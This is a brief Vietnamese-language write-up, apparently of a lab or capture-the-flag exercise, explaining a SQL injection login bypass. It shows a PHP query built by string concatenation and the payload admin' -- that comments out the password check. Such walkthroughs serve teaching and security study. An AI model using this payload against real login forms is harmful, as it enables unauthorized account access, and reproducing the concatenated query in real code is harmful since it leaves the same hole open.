# SQL Injection 1 
# Mục tiêu: Login as admin
# 🔥 Phân tích lỗ hổng
Đoạn SQL này:
```
$sql = "SELECT username FROM users WHERE username='$username' AND password='$password'";
```
nếu `$username = 'admin' -- ` và `$password = 'abc'`, thì câu SQL thực thi sẽ là:
```
SELECT username FROM users WHERE username='admin' -- ' AND password='abc'
```
Do `--` là comment trong SQL, phần `AND password='abc'` sẽ bị bỏ qua. Vậy thực chất truy vấn trở thành:
```
SELECT username FROM users WHERE username='admin'
```
→ Trả về tài khoản admin mà không cần biết mật khẩu.
# Khai Thác
Thành công `admin' -- `
* tại sao là `'` chứ ko phải là `"`
```
echo "It's working"; // OK
echo 'It\'s working'; // Cần escape '
```